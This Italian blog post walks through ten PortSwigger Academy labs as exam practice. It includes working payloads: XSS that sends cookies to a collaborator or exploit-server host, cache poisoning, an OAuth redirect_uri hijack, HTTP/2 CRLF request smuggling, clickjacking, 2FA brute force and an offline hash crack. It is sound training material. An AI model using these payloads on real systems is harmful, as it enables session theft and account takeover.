---
layout: post
title: "Dieci Roll nel Primo Step: La Prima Prova Generale per l'Esame"
date: 2026-11-25
categories: [web-security, walkthrough]
tags: [portswigger, bscp, mystery-lab, burp-suite, dom-xss, web-cache-poisoning, http-request-smuggling, oauth, clickjacking, broken-authentication, parameter-cloaking, 2fa]
excerpt: "Dieci lab di Mystery Pool in un'unica sessione, senza saltarne uno, il primo di tre prove generali prima dell'esame — e il momento che ha contato di più non era un payload, era leggere un 504 Gateway Timeout come segno che l'attacco stava funzionando, non che si era rotto."
lang: it
page_id: ten-rolls-step-one
permalink: /posts/dieci-roll-nel-primo-step/
---

Un 504 Gateway Timeout mi fissa da Repeater, e per qualche secondo sono sicuro di aver rotto qualcosa — un CRLF sbagliato, un `Content-Length` storto, qualcosa di storto nell'unico payload su cui avevo passato venti minuti a lavorare. Non si era rotto niente. Il back-end stava facendo esattamente quello che volevo: stava lì, con la porta aperta, in attesa di byte che appartenevano alla richiesta di qualcun altro. L'errore di lettura, non l'exploit, è stata la vera lezione di quel roll. È successo di nuovo due lab dopo, in una forma completamente diversa.

Questo è il primo di tre self-test prima dell'esame BSCP, uno per step: dieci lab di [Mystery Pool]({% post_url 2026-10-04-mystery-pool-strumento %}) tirati uno dietro l'altro, senza saltarne uno, ripetizioni incluse. Questo è lo step uno, il foothold. L'ultima volta che ho [girato la ruota su questo step]({% post_url 2026-10-28-tirare-lab-fino-allo-smuggling %}), avevo una sola regola — fermarmi appena usciva lo smuggling — e la ruota mi ha fatto aspettare nove lab prima di darmelo. Stavolta non c'era nessuna condizione di stop. Ho tirato dieci roll, qualunque cosa uscisse, e ho scritto quello che è successo davvero.

## Le regole del test

Tutti e dieci i topic del foothold spuntati, livello Practitioner: information disclosure, vulnerabilità DOM-based, web cache poisoning, cross-site scripting, clickjacking, HTTP request smuggling, authentication, HTTP Host header attacks, OAuth authentication, WebSockets.

Nessun limite di tempo né sul singolo lab né sulla sessione intera — l'esame vero dà quattro ore per due applicazioni e tre step ciascuna, e volevo prima vedere come si sentiva un run pulito prima di provare a forzarci sopra quell'orologio. Il totale onesto è "circa novanta minuti", non un numero di cronometro pulito, perché mi sono fermato più volte per prendere appunti e controllare cose; la maggior parte di quel tempo è finita in un solo lab (il roll 6), che si merita una sezione lunga tutta sua più avanti. Ogni lab conta ai fini dei dieci, ripetizioni incluse — una ripetizione non è un pass gratuito, è la misura vera di quanto risolverlo la prima volta mi abbia davvero insegnato qualcosa. Strumenti: Burp Scanner, Intruder, Repeater, DOM Invader, Param Miner, l'estensione HTTP Request Smuggler, e il mio [cheatsheet BSCP](https://github.com/matteo-brandolino/bscp-exam-notes). Nessuna soluzione della community, con un'eccezione — il roll 6, dove sono andato a leggere la soluzione ufficiale di PortSwigger dopo aver frainteso una risposta. Quella è tutta la storia di quel roll, raccontata per bene più avanti.

## Tabellone

| # | Lab / topic | Ripetizione? | Tempo | Esito |
|---|---|---|---|---|
| 1 | DOM XSS via `postMessage` → `innerHTML` | No | Veloce | Risolto, nessun vicolo cieco |
| 2 | DOM XSS via parameter cloaking, consegnato via cache poisoning | No | Medio | Risolto, un falso indizio (il form commenti) |
| 3 | Web cache poisoning, cookie `fehost` non keyed | **Sì** (28 ottobre) | Veloce | Risolto, riconosciuto a vista |
| 4 | OAuth account takeover via `redirect_uri` non validato | No | Veloce | Risolto, nessun vicolo cieco |
| 5 | Protezione brute-force bypassata + enumerazione username | No | Medio | Risolto |
| 6 | HTTP/2 request smuggling via CRLF injection | No | Lento (il buco nero di tempo) | Risolto, serviva la soluzione ufficiale |
| 7 | Stored XSS → cookie `stay-logged-in` rubato, craccato offline | No | Medio | Risolto, un tentativo abbandonato |
| 8 | 2FA con logica fallata via cookie `verify=` | No | Veloce | Risolto, nessun vicolo cieco |
| 9 | DOM XSS via `postMessage` (`load-channel`) | **Sì** (28 ottobre) | Veloce | Risolto, riconosciuto in pochi secondi |
| 10 | Clickjacking per innescare una DOM-based XSS | No | Veloce | Risolto, primo payload buono |

## La sessione

### Roll 1 — Il sink prima della caccia (DOM-based XSS)

DOM Invader ha trovato questo bug prima ancora che leggessi una sola riga della pagina. Un solo sink, `element.innerHTML`, quattro hit, `Event: message` che atterra su un `<div id="ads">`. Il codice vulnerabile, una volta andato a cercarlo:

```js
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

Nessun controllo su `origin`, nessuna sanitizzazione — qualunque cosa arrivi in un evento `message` viene scritta direttamente nel DOM. La PoC di conferma:

```html
<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

ospitata sull'exploit server. Il `print()` è volutamente rumoroso e innocuo per un lab — dimostra l'esecuzione senza fare danni. In un esame, dove vuoi qualcosa che puoi verificare senza un dialog che ti si piazza in mezzo, lo stesso gadget diventa un'esfiltrazione silenziosa:

```html
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
```

Sostituisci l'alert con una `fetch` verso un dominio Collaborator, e il cookie della vittima esce dal browser codificato in base64 dentro una query string — fuori banda, niente da chiudere, niente che la vittima veda. Stage 1, interattivo (serve che la vittima carichi la pagina dell'attaccante), consegnato via exploit server.

### Roll 2 — Il form commenti che non c'entrava (DOM XSS via parameter cloaking)

Ho passato i primi minuti sul form commenti, perché è lì che l'XSS "di solito" sta. Non era lì. Il vero segnale era nella proxy history fin dall'inizio, sotto un filtro che avevo impostato prima per nascondere le richieste JS — esattamente il tipo di punto cieco che ti crei da solo, e che uno scanner non ha:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Cookie: country=[object Object]; session=...
```

Un parametro `callback` JSONP-style non validato, riflesso direttamente nello script che imposta il cookie del paese. La parte interessante non era il sink, ma far arrivare un secondo valore dentro quel parametro. Questo è il **parameter cloaking**:

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

`URLSearchParams` lato client divide solo su `&`, quindi legge un solo `callback=setCountryCookie` pulito. Qualche componente più a valle divide anche su `;`, e legge un secondo `callback=alert(1)` nascosto dentro quello che sembrava il valore di `utm_content`. Due parser, una query string, due idee diverse su dove finisce un parametro — la stessa forma che ricorre di continuo una volta che inizi a cercarla (filtri che decodificano una volta contro client che decodificano due volte, validatori che leggono fino all'estensione contro kernel che leggono fino a un byte nullo).

La consegna qui ha fatto da secondo topic: la risposta era cacheable, quindi ho avvelenato la cache con Repeater invece di aver bisogno di un link diretto alla vittima — la richiesta con il parametro clonato diventa la copia in cache, e ogni visitatore successivo prende il payload gratis. Stage 1, non interattivo una volta avvelenata la cache (nessuna azione della vittima oltre a una normale visita).

### Roll 3 — La ruota si ripete, puntuale (web cache poisoning)

Stesso lab del [lab 2 della sessione del 28 ottobre]({% post_url 2026-10-28-tirare-lab-fino-allo-smuggling %}): un cookie `fehost` non keyed, riflesso in un object literal JS dentro un blocco `<script>`.

```http
GET / HTTP/2
Cookie: session=...; fehost=someString"-alert(1)-"someString
```

L'ho riconosciuto nel momento in cui il cookie è comparso riflesso nella risposta, ancora prima di costruire il payload — e quella velocità di riconoscimento è tutto il senso di girare due volte la stessa ruota. Confermato che fosse non keyed con un cache buster (un parametro anti-cache fresco più il cookie avvelenato, poi una richiesta pulita successiva senza il cookie che torna comunque avvelenata). Il payload deve restare `"-alert(1)-"` invece di un commento `//`, perché un commento cancellerebbe la `}` di chiusura di cui l'object literal ha bisogno per restare sintatticamente valido — la stessa lezione che il post di ottobre aveva già tirato fuori, confermata di nuovo sotto pressione di tempo invece che per curiosità. Stage 1, non interattivo una volta avvelenata la cache.

### Roll 4 — Reindirizza dove vuoi (OAuth account takeover)

Il topic si è auto-spoilerato: provare ad autenticarsi reindirizzava dritto a un provider di social login. La richiesta di autorizzazione non aveva nessuna validazione su `redirect_uri`:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://example.com&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net
```

Sostituisci `redirect_uri` con un dominio che controlli, e l'authorization server consegna il `code` a *te* una volta che la vittima completa il flusso. Consegna, ospitata sull'exploit server:

```html
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

La vittima, già loggata nel provider OAuth, carica la pagina; il suo browser viene reindirizzato al `redirect_uri` dell'attaccante con `?code=...` attaccato, e quella richiesta finisce nel log di accesso dell'exploit server stesso:

```
10.0.3.8  [timestamp] "GET /?code=wWaBVDEktQ25AaMzPSO07yDNWoTQraYb4PYFK2lUIik HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) ..."
```

Da lì è stato uno scambio diretto: intercettare il mio stesso tentativo di login allo step di callback, sostituire il mio code con quello rubato della vittima, inoltrarlo, loggarsi come lei. Nessun vicolo cieco — nel momento in cui `redirect_uri` è tornato non validato, il resto della catena ha seguito da solo. Stage 2 (escalation di privilegi dentro l'account di qualcun altro), interattivo, consegnato via exploit server.

### Roll 5 — Due header, due problemi (broken authentication)

Le credenziali note funzionavano; quelle casuali guadagnavano un ban di trenta minuti dopo pochi tentativi. Il riflesso dai roll precedenti è scattato: probabilmente qualche header bypassa il lockout, e la scansione di Param Miner sugli header ha trovato subito quello giusto — `X-Forwarded-For`. L'app si fida di quell'header più dell'IP reale di connessione per il suo contatore di lockout, quindi ruotando il valore si resetta il ban a ogni richiesta.

Questo risolve il *blocco*, non il login in sé — mi serviva ancora uno username valido. Intruder, attacco pitchfork (set di payload paralleli, non ogni combinazione), una posizione su `X-Forwarded-For` e una sul campo username, una password lunga fissa e sbagliata solo per generare traffico. Una risposta si è distinta per lunghezza: `arlington`. Un secondo passaggio pitchfork — `X-Forwarded-For` ancora in rotazione, username fissato ad `arlington`, una wordlist di password nella seconda posizione — ha tirato fuori un `302`. L'ho seguito, mi sono loggato. Due problemi di fiducia su header diversi impilati uno sull'altro: il lockout si fidava di un header spoofabile, e l'indizio di username enumeration stava in un'anomalia di lunghezza della risposta, il segnale più vecchio del mestiere. Stage 1, non interattivo — ogni passo era una richiesta diretta, nessuna vittima in mezzo.

### Roll 6 — Il 504 che in realtà era un sì (HTTP/2 request smuggling via CRLF injection)

Questo è il lab che si è mangiato la maggior parte della sessione, e il motivo è interamente colpa mia, non del lab.

Lo scanner di Burp ha segnalato **HTTP request smuggling** — tentativo all'inizio, poi confermato — e ha definito la richiesta "kettled": *contiene header che non possono essere rappresentati completamente in sintassi HTTP/1*, nello specifico un newline dentro il valore di un header. Quell'avviso è l'indizio di identificazione, e va scomposto, perché è il meccanismo di tutto il lab. Gli header HTTP/2 sono campi binari a lunghezza esplicita (HPACK), quindi un valore può legalmente contenere un `\r\n` grezzo senza nessun significato speciale — sono solo byte dentro un campo di lunghezza nota. Il front-end, però, spesso parla HTTP/2 col browser e HTTP/1.1 col back-end, quindi a un certo punto deve serializzare quell'header in testo, dove `\r\n` *è* il delimitatore tra righe di header. Se non lo filtra prima del downgrade, il CRLF incorporato diventa un vero a capo nella richiesta riscritta — il valore dell'header di una richiesta diventa l'inizio di una seconda richiesta, smuggled, che il back-end legge come genuinamente separata.

Il lab confermato è quello di PortSwigger "[HTTP/2 request smuggling via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)". La catena ufficiale: conferma che la cronologia di ricerca sia legata al cookie di sessione, imposta la richiesta su HTTP/2 nell'Inspector di Burp, aggiungi un header arbitrario il cui valore porta un CRLF iniettato seguito da `Transfer-Encoding: chunked`, poi conferma il desync con un body chunked minimale (`0\r\n\r\nSMUGGLED`) — ogni seconda richiesta dovrebbe tornare un `404`, prova che il back-end sta appendendo la richiesta successiva al tuo prefisso smuggled.

Proprio in quel passo di conferma ho frainteso il mio stesso strumento. Sono saltato dritto al body della fase di exploitation — una `POST` smuggled con `Content-Length: 800` e un body di 8 byte (`search=x`) — e l'ho inviata direttamente in Repeater:

```http
0 \r\n
\r\n
POST / HTTP/1.1 \r\n
Host: YOUR-LAB-ID.web-security-academy.net \r\n
Cookie: session=... \r\n
Content-Length: 800 \r\n
\r\n
search=x
```

Repeater mi ha dato un `504 Gateway Timeout`, e per un attimo ho pensato di aver rotto la richiesta. Non l'avevo rotta. `Content-Length: 800` dice al back-end di aspettarsi 800 byte di body; ne avevo mandati 8. Il back-end fa esattamente quello che l'header dice — tiene la connessione aperta, in attesa dei ~792 byte mancanti, che dovrebbero arrivare come parte della *prossima* richiesta reale che riusa quella stessa connessione verso il back-end. Il timeout d'attesa di Burp alla fine rinuncia e mostra un 504 sulla richiesta di smuggling stessa. Quel timeout non è un bug report, è la conferma che il desync sta funzionando: la connessione è davvero rimasta aperta, a metà del body, in attesa di ingoiare la richiesta di qualcun altro. Il vero segnale che il lab vuole — un `404`, un termine di ricerca riflesso, o la richiesta catturata della vittima — non compare mai nella risposta di Repeater a *questa* richiesta. Compare nel browser integrato di Burp, a un reload immediato, e nella lista "recent searches" del sito.

Una volta riprovato con il timing giusto — invia la `POST` di smuggling, ricarica subito la scheda del browser, controlla le ricerche recenti — la GET della vittima era lì, header inclusi, cookie di sessione compreso:

```
xGET / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net ... cookie: victim-fingerprint=...; session=WN2MG7GRjgDeSMWX7hz69GGTmPa8jxM; _lab_analytics=...
```

Rigiocato quel cookie di sessione sulla home page, loggato come la vittima. Lab risolto. La lezione che mi è costata tempo: **un timeout del tuo stesso strumento è un dato, non necessariamente un errore** — quando hai costruito deliberatamente una richiesta che dipende da qualcos'altro che arriva dopo, un timeout è la forma attesa di "sta funzionando, solo che non ha ancora finito". Stage 1, non interattivo sulle richieste dell'attaccante stesso, ma la cattura finale aveva bisogno del normale ciclo di reload di 15 secondi della vittima per fornire i byte mancanti.

### Roll 7 — Il tentativo sbagliato che ha reso ovvia la scorciatoia (stored XSS → crack offline)

Questo lab si apriva con un cookie persistente "stay logged in", formato `base64(username:md5(password))` per analogia col mio. Primo istinto: bruteforzarlo live. Intruder, attacco sniper sull'intero valore del cookie, una catena di processing `Hash: MD5 → Add Prefix "carlos:" → Base64-encode`, una piccola wordlist — e su 100 richieste, nemmeno una risposta corrispondeva a "Update email", l'indizio di un login riuscito come carlos.

Il bug non era la wordlist. Era un'impostazione che avevo lasciato attiva per abitudine: "URL-encode these characters" era attiva su quella posizione di payload, e l'elenco di caratteri includeva `+`, `/` e `=` — esattamente i caratteri con cui è costruita una stringa Base64. Quell'opzione è utile dentro una URL o un body di form; dentro un header `Cookie` è attivamente distruttiva, perché il percent-encoding lì corrompe semplicemente il valore prima che venga inviato. Ogni singolo candidato — password giusta compresa, se fosse stata nella mia lista — sarebbe uscito storpiato. È la stessa forma di errore del 504 del roll 6, un lab prima: uno strumento che fa esattamente quello che gli ho detto di fare, al livello sbagliato, e io che leggo la colonna dei risultati vuota come "nessuna di queste password funziona" invece di "nessuna delle mie richieste è ben formata".

Ho abbandonato il brute force una volta trovato qualcosa di più veloce sullo stesso target: una stored XSS nel form dei commenti, nessun encoding sull'input. Pubblicata come commento:

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

carlos carica la pagina, lo script parte, i suoi cookie viaggiano nell'URL fino al log di accesso dell'exploit server. Il primo valore catturato era un token di sessione semplice — non craccabile, solo un identificatore opaco. Il secondo era il vero obiettivo, il cookie `stay-logged-in` di carlos:

```
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

che decodificato (`base64 -d`) dà `carlos:26323c16d5f4dabff3bb136f2460a943` — il suo username accanto al suo vero hash della password, nessun tentativo da indovinare, nessun round-trip verso il server per ogni prova. Da lì è un attacco a dizionario contro un hash che hai già in mano, una classe di problema diversa e molto più veloce di un brute force live:

```bash
hashcat -m 0 -a 0 26323c16d5f4dabff3bb136f2460a943 rockyou.txt
```

Password recuperata: `onceuponatime`. Login come carlos, account eliminato, che era l'obiettivo vero del lab. La catena completa — stored XSS per esfiltrare un cookie, decodifica, isolamento dell'hash, crack *offline*, login con la password in chiaro — ha fatto sembrare il tentativo di brute force precedente esattamente quello che era: un percorso più lento e rotto verso un hash che non avevo nemmeno bisogno di indovinare, una volta che un bug completamente diverso me l'ha consegnato. Stage 2 (escalation di privilegi dentro l'account di carlos e oltre, fino all'eliminazione), interattivo per la consegna (carlos deve caricare la pagina col commento), non interattivo per tutto quello che viene dopo, una volta che il cookie atterra nel log.

### Roll 8 — Un cookie che risponde per qualcun altro (2FA con logica fallata)

L'indizio era strutturale: un cookie `verify=` che indica di chi va controllato il codice 2FA, seduto proprio accanto a un cookie di sessione già valido.

```http
GET /login2 HTTP/2
Cookie: verify=carlos; session=YOUR-OWN-SESSION
```

Impostare `verify` su `carlos` mantenendo la mia stessa sessione autenticata ha fatto generare al server un codice 2FA *vero* per carlos — il server si fida del cookie per sapere di chi è questa verifica, senza mai controllarlo contro l'utente che si è effettivamente autenticato con una password. Il codice è di quattro cifre, diecimila valori possibili, e niente nel flusso limita il numero di tentativi:

```http
POST /login2 HTTP/2
Cookie: verify=carlos; session=YOUR-OWN-SESSION
Content-Type: application/x-www-form-urlencoded

mfa-code=1271
```

Un sniper diretto di Intruder su `mfa-code`, `verify=carlos` tenuto fisso su tutto l'attacco. Il codice `1271` ha fatto centro; caricare la risposta corrispondente mi ha loggato come carlos. Una catena pulita, dall'inizio alla fine, una volta che il ruolo del cookie nel flusso è diventato ovvio: l'identità per uno step privilegiato decisa da qualcosa che il client controlla, non da quello che il client ha dimostrato prima. Stage 2, non interattivo — l'intero attacco è fatto di richieste che l'attaccante invia riguardo all'account di qualcun altro, nessuna azione della vittima richiesta.

### Roll 9 — Riconoscimento in meno di un minuto (DOM XSS, ripetizione)

Scheda **Messages** di DOM Invader, non Sinks stavolta — sette chiamate `postMessage` catturate, una segnalata:

```json
{"type":"load-channel","url":"ij5uthyr0-\<>'\":"}
```

Stessa forma del [lab 5 del 28 ottobre]({% post_url 2026-10-12-xss-dom-messaggi-web-url-javascript %}): un `type` del messaggio sceglie un ramo che assegna un `url` controllato dall'attaccante direttamente nell'`src` di un iframe, nessun controllo su `origin` e nessuna validazione dello schema. L'exploit:

```html
<iframe src=https://TARGET.web-security-academy.net// onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

Risolto al primo tentativo. Questo è tutto l'argomento a favore di girare la stessa ruota più di una volta: la prima volta, questo schema richiede una vera ricerca per essere riconosciuto; la seconda volta, dal flag di DOM Invader al payload funzionante ci è voluto meno di un minuto, perché la forma era già in mano. Stage 1, interattivo, consegnato via exploit server.

### Roll 10 — Il click che non era tuo (clickjacking per innescare una DOM-based XSS)

Il nome del lab tradiva il topic — "Exploiting clickjacking vulnerability to trigger DOM-based XSS" — ma non il meccanismo, e lo scanner di Burp ha confermato subito il pezzo mancante: nessun `X-Frame-Options` o CSP frame-ancestors su `/` o `/feedback`, quindi entrambe le pagine possono essere framate.

`/feedback` legge i suoi campi del form — `name`, `email`, `subject`, `message` — dalla query string lato client, ed è proprio questo l'indizio che si tratta di DOM-based e non reflected lato server (l'ancora `#feedbackResult` è JS che fa il lavoro al caricamento, non un template del server). Questo significa che il payload può già stare dentro l'`src` dell'iframe prima ancora che la vittima tocchi la pagina — l'unica cosa che manca è un click vero per inviare il form:

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:610px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://TARGET.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

Un iframe quasi invisibile (`opacity: 0.0001`, ancora renderizzato e cliccabile, solo non visibilmente così) impilato esattamente sopra un div "Click me" fasullo. La vittima vede un prompt innocuo; il suo click finisce davvero sul bottone di invio della pagina framata, innescando una DOM XSS che non aveva bisogno di nient'altro da lei se non quel singolo click. Primo payload, primo tentativo. Il clickjacking qui non è il bug da dimostrare — è il meccanismo di consegna per un sink che altrimenti resterebbe lì, armato ma irraggiungibile senza un gesto vero dell'utente. Stage 1, interattivo per definizione (il clickjacking non ha altra modalità), consegnato via una pagina costruita ad hoc su cui la vittima viene attirata.

## Il pattern

Due vicoli ciechi separati in questo run — il 504 del roll 6, la corruzione silenziosa da URL-encoding del roll 7 — si sono rivelati lo stesso errore travestito in due forme diverse: **ho letto l'output del mio stesso strumento come un fallimento del target, quando in realtà era la mia stessa richiesta malformata o ancora in corso.** Un timeout da una connessione lasciata deliberatamente aperta a metà body non è un errore, è la forma del successo per quello specifico attacco. Una colonna di risultati a zero match non è la prova che la wordlist è sbagliata, è una ragione per andare a guardare cosa hai mandato davvero. In entrambi i casi, la correzione è stata la stessa mossa: smettere di leggere il riassunto che ti dà Burp, e andare a guardare la richiesta o la risposta grezza sotto.

Il secondo filo lega i roll 2, 4, 5, 7 e 8, ed è quello che metterei in cima a qualunque cheatsheet BSCP sull'autenticazione: **un'applicazione che si fida di un valore controllato dal client per rispondere a "chi è questo?", invece di legare quella risposta alla sessione che si è già autenticata.** Una query string decide quale `callback` gira (roll 2). Un `redirect_uri` decide dove finisce un authorization code (roll 4). Un header `X-Forwarded-For` decide di chi viene incrementato il contatore di lockout (roll 5). Un cookie `stay-logged-in`, una volta rubato, decide chi sei senza mai più toccare un controllo password (roll 7). Un cookie `verify=` decide per chi viene generato e verificato un codice 2FA (roll 8). Cinque meccanismi diversi, una frase li copre tutti: se l'identità o lo scope sono decisi da qualcosa che il client ha mandato invece che da qualcosa che il server ha già verificato, quello è il primo punto su cui spingere.

E sotto entrambi: **la consegna è un problema a sé, separato dal bug.** Quattro di questi dieci lab avevano bisogno di un secondo trucco solo per mettere la vulnerabilità davanti a una vittima — il web cache poisoning ha portato una XSS a ogni visitatore (roll 2, 3), il clickjacking ha fornito l'unico click di cui un sink DOM aveva bisogno (roll 10), la stored XSS ha fatto doppio lavoro come proprio meccanismo di consegna per rubare un cookie (roll 7), e il response queue poisoning via smuggling ha consegnato l'intera richiesta di qualcun altro nelle tue mani (roll 6). Il sink raramente è la parte difficile. Farlo scattare per qualcuno che non sei tu lo è.

## Esame e campo

**In esame**, gli indizi di identificazione in questo run valgono più di qualunque payload: un sink `postMessage` si accende nella scheda Sinks o Messages di DOM Invader prima ancora di scrivere qualcosa (roll 1, 9); un `callback=` o `redirect_uri=` non validato è visibile nell'istante in cui leggi la richiesta, senza nessun tool (roll 2, 4); una risposta che differisce in lunghezza per un solo username è l'indizio di enumerazione più vecchio che esista (roll 5); uno scanner che chiama una richiesta "kettled" sta nominando il meccanismo esatto di un bug di smuggling da downgrade HTTP/2, non un avviso generico (roll 6); e un cookie il cui nome suona come un verbo puntato verso qualcun altro — `verify=`, `stay-logged-in=` — merita di farsi chiedere "di chi decide davvero questo l'identità?" prima di qualunque altra cosa (roll 7, 8). Sette dei dieci roll sono non interattivi una volta che la richiesta iniziale atterra; solo i roll XSS via `postMessage`, l'account takeover OAuth, e il clickjacking per definizione hanno bisogno di una vittima in mezzo, e tutti e tre hanno una storia di consegna pulita (link dell'exploit server, o una pagina su cui attirare) invece che complicata. I vicoli ciechi da nominare: non leggere un timeout del tuo stesso tentativo di smuggling come un fallimento senza controllare cosa sta effettivamente aspettando; non dare per scontato che le impostazioni di encoding della richiesta (l'URL-encoding, in particolare) siano default sicuri una volta che una posizione di payload si sposta da una query string dentro un header; e non saltare il passo di conferma di un attacco di smuggling per andare dritti alla richiesta della fase di exploit, perché il passo di conferma è quello che ti dice *come si presenta davvero un successo*.

**Sul campo**, la classifica per raggio d'impatto appare diversa da quella per quanto è stato difficile trovare ogni bug. Il bug `redirect_uri` OAuth e il furto del cookie stay-logged-in sono account takeover completi raggiungibili da chiunque riesca a far cliccare una volta la vittima; i lab di cache poisoning e clickjacking colpiscono ogni visitatore o un click mirato, rispettivamente, senza bisogno di nessuna credenziale. Il lab di smuggling è la precondizione più rara (un vero mismatch di protocollo tra front-end e back-end) ma il payoff singolo più ampio, dato che il response queue poisoning fa trapelare *il traffico di altri utenti* in blocco. Il filo difensivo che attraversa quasi tutti e dieci: **non lasciare mai che identità o scope siano decisi da un valore che il client ha mandato in questa richiesta** — legali, invece, a qualunque cosa il server abbia già verificato quando è iniziata la sessione.

## Cosa viene dopo

Due topic del pool non sono mai usciti in dieci roll: information disclosure e WebSockets. Non è un giudizio su di loro, è solo la ruota che fa la ruota — il prossimo giro su questo step dovrebbe probabilmente pesare di più verso i topic rimasti in silenzio stavolta. Il passo successivo più grande, però, è il secondo di tre test: dieci roll nello step di escalation di privilegi del BSCP, con la stessa regola — nessun salto, ripetizioni contate, tempi scritti mentre succedono invece che ricostruiti dopo.

## Punti da ricordare

- Un timeout dalla tua stessa richiesta non è automaticamente un bug report. Se hai costruito una richiesta che dipende da byte che arrivano dopo (un body smuggled con un `Content-Length` sovradimensionato), una connessione bloccata è la forma *attesa* di funzionamento — controlla cosa sta aspettando prima di dare per scontato di aver rotto qualcosa.
- Le impostazioni di encoding viaggiano male tra contesti diversi. L'URL-encoding è sicuro dentro una query string e corrompe attivamente un valore Base64 seduto dentro un header `Cookie` — controlla dentro cosa sta davvero una posizione di payload prima di fidarti del default di uno strumento.
- "Questo valore dice chi sei tu?" è la domanda singola più utile che attraversa OAuth, cookie, header e logica 2FA. Se la risposta è "qualunque cosa il client abbia appena mandato", quello è il bug.
- La consegna è un'abilità separata dal trovare il sink. Cache poisoning, clickjacking e stored XSS hanno fatto lo stesso lavoro in questo run: mettere un payload davanti a qualcuno che non sei tu.
- Rigirare lo stesso lab due volte non è tempo sprecato — un riconoscimento che la prima volta ha richiesto una vera ricerca, la seconda volta ci ha messo meno di un minuto, e quel divario è il vero effetto dell'allenamento.

## Riferimenti utili

- [PortSwigger: HTTP/2 request smuggling via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)
- [PortSwigger Web Security Academy: DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) · [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) · [OAuth authentication](https://portswigger.net/web-security/oauth) · [Authentication](https://portswigger.net/web-security/authentication) · [Clickjacking](https://portswigger.net/web-security/clickjacking) · [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
- [XSS DOM via messaggi web e una URL JavaScript]({% post_url 2026-10-12-xss-dom-messaggi-web-url-javascript %})
- [Tirare lab fino allo smuggling]({% post_url 2026-10-28-tirare-lab-fino-allo-smuggling %})
- [Mystery Pool]({% post_url 2026-10-04-mystery-pool-strumento %})
- [I miei appunti per l'esame BSCP](https://github.com/matteo-brandolino/bscp-exam-notes)

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato (PortSwigger Web Security Academy). Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
